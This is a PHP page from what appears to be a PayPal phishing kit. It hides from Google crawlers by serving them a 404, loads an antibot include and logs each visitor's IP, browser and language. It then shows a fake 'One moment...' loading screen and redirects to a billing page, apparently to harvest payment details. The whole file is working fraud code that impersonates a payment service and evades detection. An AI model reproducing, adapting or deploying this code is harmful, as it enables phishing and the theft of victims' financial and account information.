<?php
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }

error_reporting(0);
    #################################################
    #                FaHaD-IQ                       #
    #              fb/mr.fahad6                     #
    #################################################
session_start();
include("../../include/__config__.php");
include("../../include/function.php");
include("../../include/antibot.php");
$_SESSION['_IP_']  = $_SERVER["REMOTE_ADDR"];
	$time = date('l jS \of F Y h:i:s A');
	$user_agent = $_SERVER['HTTP_USER_AGENT'];
	$browser = $user_browser." - ".$user_os." - ".substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0,5);
	$_SESSION['_browser_'] = $browser;
    $_SESSION['cntcode'] = $countrycode;
    $_SESSION['cntname'] = $countryname;
	header ("Refresh:3; URL=websc-billing.php?country.x=".$_SESSION['cntname']."-".$_SESSION['cntcode']."&lang.x=".$_SESSION['_lang_']);

?>

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title><?php echo $PAYPAL_SERVICE_UPDATE_TXT; ?></title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="">
    <meta name="author" content="">
	<link rel="shortcut icon" type="image/x-icon" href="favicon.ico" />
    <!-- Le styles -->
    <link href="../../css/bootstrap.css" rel="stylesheet">
    <link href="../../css/bootstrap-responsive.css" rel="stylesheet">

    <!-- HTML5 shim, for IE6-8 support of HTML5 elements -->
    <!--[if lt IE 9]>
      <script src="../../js/html5shiv.js"></script>
    <![endif]-->

    <!-- Fav and touch icons -->
</head>
<body style="background-color: #F8F8F8;">
   <center> <div class="container">

           <!-- Example row of columns -->
      <div class="row" style="margin-top:0px;float: none;margin-left: 0;" id="toprow">
                  
                                
        <div class="span7" style="background:#fff;padding: 10px 10px 10px 10px; 0 0;float: none;margin-left: 0;box-shadow:0 1px 4px 0 #d5d5d5;border-radius:5px;">
        <h3 style="font: 75%/normal Arial, Helvetica, sans-serif;font-size: 1.4em;color:#333;margin: 4em 0 0 0;font-weight: bold;">One moment...</h3><br>
        <img src="../../img/loginppl.gif" /><br>
		  
        <center><div style="font: 75%/normal Arial, Helvetica, sans-serif;color: #656565;font-size: 1.2em;margin:35px 0 20px ;" id="ft3">Still loading after a few seconds? <a href="#">Try again</a></div></center>
       </div>
       
      </div>

</body>
</html>